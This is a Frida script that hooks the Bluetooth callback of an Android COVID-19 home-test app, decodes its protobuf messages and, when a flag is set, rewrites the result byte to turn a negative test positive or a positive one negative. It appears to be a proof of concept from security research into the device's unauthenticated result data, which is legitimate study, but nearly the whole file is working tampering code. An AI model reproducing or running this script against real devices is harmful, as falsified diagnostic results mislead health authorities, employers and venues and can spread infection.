console.log("[#] script loaded")

/**
 * 
 * Frida script which will attempt to change a COVID 19 test
 * not perfect because it would take time to fully implement their custom protobuf parser
 * instead, this script will look for specific byte pattern and replace it
 * 
 * 04 08 13 10 03 = negative
 * 04 08 13 10 02 = positive
 * 
 * Android app version: 1.4.2
**/

var flipResults = false // change to true if you want to flip results

var yayconstantbytepositionyay = 0
var yayconstantpayloadyay = []
var yayconstantpayloadlengthyay = yayconstantpayloadyay.length
Java.perform(function() {
    var yayclass1yay = Java.use('b.a.a.h.v3.k0$a');

    yayclass1yay.onCharacteristicChanged.overload('android.bluetooth.BluetoothGatt', 'android.bluetooth.BluetoothGattCharacteristic').implementation = function(a,b) {

        yayconstantpayloadyay = b.getValue()
        yayconstantpayloadlengthyay = yayconstantpayloadyay.length
        var yayprotobufyay = bytes2hex(yayconstantpayloadyay)
        var yayLengthyay = yayprotobufyay.length
        var yayLength2yay = yayconstantpayloadyay.length

        var yayfirstByteyay = theParser(yayconstantpayloadyay, 0)
        var yaybluetoothpacketcountyay = theParser()
        var intMsgCase = theParser()
        var intPacketSize = theParser()
        
        var yayParsedyay = "\n\t"

        switch (intMsgCase[1]){ // com.cuehealth.protobuf.reader.CueMessage.CueMessage(Abstracto, g0)
            case 8:
                var yayMsgTypeyay = "8 not_named"
            break
            case 16:
                var yayMsgTypeyay = "16 not_named"
            break
            case 26:
                var yayMsgTypeyay = "26 CueDeviceInfo"
            break
            case 34:
                var yayMsgTypeyay = "34 CueDeviceStatus"
                yayParsedyay = yayParsedyay + cueDeviceStatus(intPacketSize[1])
            break
            case 42:
                var yayMsgTypeyay = "42 CueDeviceBatteryStatus"
            break
            case 80:
                var yayMsgTypeyay = "80 not_named"
            break
            case 90:
                var yayMsgTypeyay = "90 CueProcedureStep"
            break
            case 106:
                var yayMsgTypeyay = "106 CueDeviceStats"
            break
            case 114:
                var yayMsgTypeyay = "114 CueResetCause"
            break
            case 122:
                var yayMsgTypeyay = "122 CueCartridgeRuntimeData"
            break
            case 130:
                var yayMsgTypeyay = "130 CueProcedureHeader"
            break
            case 138://
                var yayMsgTypeyay = "138 CueProcedureResponse"
            break
            case 144:
                var yayMsgTypeyay = "144 not_named"
            break
            case 154:
                var yayMsgTypeyay = "154 CueRuntimeDataReadResponse"
            break
            case 162:
                var yayMsgTypeyay = "162 CartridgeData"
            break
            case 170:
                var yayMsgTypeyay = "170 TestResults"

                var yayResultFoundyay = true
                var yayNegativeResultyay = true

                if (yayprotobufyay.includes("220408131003", 10)){
                    yayParsedyay = yayParsedyay +
                        "\n    [#] COVID-19 NEGATIVE test found"
                } else if (yayprotobufyay.includes("220408131002", 10)){
                    yayParsedyay = yayParsedyay +
                        "\n    [#] COVID-19 POSITIVE test found"
                        yayNegativeResultyay = false
                } else {
                    var yayResultFoundyay = false
                }

                if (yayResultFoundyay) { // results found in payload
                    if (flipResults) { // flip results = true
                        if (yayNegativeResultyay) { // negative test
                            var yaypositionyay = yayprotobufyay.indexOf("220408131003")
                            var yayrawbytesyay = b.getValue()
                            yayrawbytesyay[(yaypositionyay/2)+5] = 2
                            b.setValue(yayrawbytesyay)
                            yayParsedyay = yayParsedyay +
                            "\n\t[#] changed COVID-19 NEGATIVE to POSITIVE" +
                            "\n\t[#] new hex payload: " + bytes2hex(yayrawbytesyay)
                        } else { // positive test
                            var yaypositionyay = yayprotobufyay.indexOf("220408131002")
                            var yayrawbytesyay = b.getValue()
                            yayrawbytesyay[(yaypositionyay/2)+5] = 3
                            b.setValue(yayrawbytesyay)
                            yayParsedyay = yayParsedyay +
                            "\n\t[#] changed COVID-19 POSITIVE to NEGATIVE" +
                            "\n\t[#] new hex payload: " + bytes2hex(yayrawbytesyay)
                        }
                    } else { // flip results = false
                        if (yayNegativeResultyay) { // negative test
                            yayParsedyay = yayParsedyay +
                            "\n\t[#] did NOT change COVID-19 NEGATIVE to POSITIVE"
                        } else { // positive test
                            yayParsedyay = yayParsedyay +
                            "\n\t[#] did NOT change COVID-19 POSITIVE to NEGATIVE"
                        }
                    }
                } else {
                    yayParsedyay = yayParsedyay +
                    "\n\t[#] did NOT find any test results in payload"
                }
            break
            case 178:
                var yayMsgTypeyay = "178 EccPublicKey"
            break
            case 186:
                var yayMsgTypeyay = "186 HMAC"
            break
            default:
                var yayMsgTypeyay = "X UNKNOWN"
        }

        console.log(
            "[#] " + yayMsgTypeyay.split(')')[0].split(' ')[1] + //message type
            "\n    hex payload: " + yayprotobufyay +
            "\n    raw bytes length: " + yayLength2yay +
            "\n    bluetooth packet count: " + yaybluetoothpacketcountyay[1] +
            "\n    packet type: " + yayMsgTypeyay +
            "\n    packet size: " + intPacketSize[1] +
            yayParsedyay +
            "\n"
            )

        var ret_value = this.onCharacteristicChanged(a,b);

        // reset
        yayconstantbytepositionyay = 0
        yayconstantpayloadyay = []
        yayconstantpayloadlengthyay = yayconstantpayloadyay.length

        return ret_value;

    }

});

function bytes2hex(array) {
    var result = '';
    for (var i = 0; i < array.length; ++i)
        result += ('0' + (array[i] & 0xFF).toString(16)).slice(-2);
    return result;
};

function theParser() { // returns [byteposition, result]

    var var3_bytePosition = yayconstantbytepositionyay
    var var1_payloadLength = yayconstantpayloadlengthyay

    if (var1_payloadLength != var3_bytePosition) {
        var var6 = yayconstantpayloadyay
        var var2_bytePositionPlus1 = var3_bytePosition + 1;
        var var7 = var6[var3_bytePosition];
        if (var1_payloadLength - var2_bytePositionPlus1 >= 9) {
            var1_payloadLength = var2_bytePositionPlus1 + 1;
            var3_bytePosition = var7 ^ var6[var2_bytePositionPlus1] << 7;
            if (var7 >= 0) {
                yayconstantbytepositionyay = var2_bytePositionPlus1;
                return [var3_bytePosition, var7] // need byte position and var7 result
                    
            }
            if (var3_bytePosition < 0) {
                var2_bytePositionPlus1 = var3_bytePosition ^ -128;
            } else {
                var2_bytePositionPlus1 = var1_payloadLength + 1;
                var3_bytePosition ^= var6[var1_payloadLength] << 14;
                if (var3_bytePosition >= 0) {
                    var3_bytePosition ^= 16256;
                    var1_payloadLength = var2_bytePositionPlus1;
                    var2_bytePositionPlus1 = var3_bytePosition;
                } else {
                    var1_payloadLength = var2_bytePositionPlus1 + 1;
                    var2_bytePositionPlus1 = var3_bytePosition ^ var6[var2_bytePositionPlus1] << 21;
                    if (var2_bytePositionPlus1 < 0) {
                        var2_bytePositionPlus1 ^= -2080896;
                    } else {
                        var var4 = var1_payloadLength + 1;
                        var var5 = var6[var1_payloadLength];
                        var3_bytePosition = var2_bytePositionPlus1 ^ var5 << 28 ^ 266354560;
                        var2_bytePositionPlus1 = var3_bytePosition;
                        var1_payloadLength = var4;
                        if (var5 < 0) {
                            var var8 = var4 + 1;
                            var2_bytePositionPlus1 = var3_bytePosition;
                            var1_payloadLength = var8;
                            if (var6[var4] < 0) {
                                var4 = var8 + 1;
                                var2_bytePositionPlus1 = var3_bytePosition;
                                var1_payloadLength = var4;
                                if (var6[var8] < 0) {
                                    var8 = var4 + 1;
                                    var2_bytePositionPlus1 = var3_bytePosition;
                                    var1_payloadLength = var8;
                                    if (var6[var4] < 0) {
                                        var4 = var8 + 1;
                                        var2_bytePositionPlus1 = var3_bytePosition;
                                        var1_payloadLength = var4;
                                        if (var6[var8] < 0) {
                                            var1_payloadLength = var4 + 1;
                                            var2_bytePositionPlus1 = var3_bytePosition;
                                            if (var6[var4] < 0) {
                                                return [var3_bytePosition, 'idkyet1']
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            yayconstantbytepositionyay = var1_payloadLength;
            return [var3_bytePosition, var2_bytePositionPlus1] // need byte position and var2_bytePositionPlus1 result
                
        }
    }
    return [var3_bytePosition + 1, -1]
}
    
function theParserHelper1() {
    var j = 0
    for (var i = 0; i < 64; i += 7) {
        var K = theParserHelper2()
        j |= (K & 127) << i
        if ((K & 128) == 0) {
            return j
        }
    }
}

function theParserHelper2() {
    var i = yayconstantbytepositionyay
    if (i != yayconstantpayloadlengthyay) {
        var bArr = yayconstantpayloadyay
        yayconstantbytepositionyay = i + 1
        return bArr[i] 
    }
}

function cueDeviceStatus(intPacketSize) {
    var statusArr = ["UNKNOWN", "WAITING_FOR_CART", "WAITING_FOR_SAMPLE", "RUNNING_TEST", "TEST_COMPLETED", "CART_ERROR", "DEVICE_ERROR", "TEST_PAUSED", "PENDING_PAUSED"]

    var yayflagyay = true
    var yayresultyay = ""

    while (yayflagyay) {
        var yayintyay = theParser()[1]

        switch(yayintyay){
            case 8: // state, p()
                var statusvalue = theParser()[1]
                yayresultyay = yayresultyay + "status: " + statusvalue + " (" + statusArr[statusvalue] + ")" +
                "\n\t"
                continue
            case 16: // error, p()
                var errorvalue = theParser()[1]
                yayresultyay = yayresultyay + "error: " + errorvalue +
                "\n\t"
                continue
            case 40: // elapsed time, H()
                var elapsedtimevalue = theParser()[1]
                yayresultyay = yayresultyay + "elapsed time: " + elapsedtimevalue +
                "\n\t"
                continue
            case 58: // cart status, builder
                var cartstatussize = theParser()[1]
                if (cartstatussize % 2) {
                    cartstatussize = cartstatussize + 1
                }
                var tempmarker = cartstatussize/2
                while (tempmarker != 0){
                    theParser()
                    tempmarker = tempmarker - 1
                }
                yayresultyay = yayresultyay + "cartstatussize: " + cartstatussize +
                "\n\t"
                continue
            case 80: // device warning, p()
                var devicewarningvalue = theParser()[1]
                yayresultyay = yayresultyay + "devicewarning: " + devicewarningvalue +
                "\n\t"
                continue
            case 98: // preheat, builder
                var preheatsize = theParser()[1]
                if (preheatsize % 2) {
                    preheatsize = preheatsize + 1
                }
                var tempmarker = preheatsize/2
                while (tempmarker != 0){
                    theParser()
                    tempmarker = tempmarker - 1
                }
                yayresultyay = yayresultyay + "preheatsize: " + preheatsize +
                "\n\t"
                continue
            case 106: // uuid, builder
                var uuidsize = theParser()[1]
                if (uuidsize % 2) {
                    uuidsize = uuidsize + 1
                }
                var tempmarker = uuidsize/2
                while (tempmarker != 0){
                    theParser()
                    tempmarker = tempmarker - 1
                }
                yayresultyay = yayresultyay + "uuidsize: " + uuidsize +
                "\n\t"
                continue
            case 112: // mode, p()
                var modevalue = theParser()[1]
                yayresultyay = yayresultyay + "mode: " + modevalue +
                "\n\t"
                continue
            case 130: // accelstatus, builder
                var accelsize = theParser()[1]
                if (accelsize % 2) {
                    accelsize = accelsize + 1
                }
                var tempmarker = accelsize/2
                while (tempmarker != 0){
                    theParser()
                    tempmarker = tempmarker - 1
                }
                yayresultyay = yayresultyay + "accelsize: " + accelsize +
                "\n\t"
                continue
            default:
                if ((intPacketSize - 2) == yayconstantbytepositionyay){
                    yayresultyay = yayresultyay + "end of packet"
                    break
                }
                yayresultyay = yayresultyay + "default hit" +
                "\n\t"
                break
        }

        yayflagyay = false
    }
    return yayresultyay
}
